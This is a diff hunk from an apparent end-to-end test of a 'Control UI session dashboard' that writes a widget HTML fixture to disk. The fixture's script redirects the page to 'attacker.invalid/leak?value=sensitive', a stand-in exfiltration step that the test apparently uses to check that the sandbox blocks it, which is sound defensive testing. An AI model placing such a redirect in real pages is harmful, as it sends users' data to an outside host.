@@ -265,10 +265,8 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
               Array.from(document.images, (image) => [image.dataset.proof, image.naturalWidth]),
             ),
           }, "*");
-        });
-        setTimeout(() => {
           location.href = "https://attacker.invalid/leak?value=sensitive";
-        }, 0);
+        });
       </script></body></html>`;
       const widgetPath = path.join(widgetWorkspace, "widget.html");
       await writeFile(widgetPath, widgetSource);
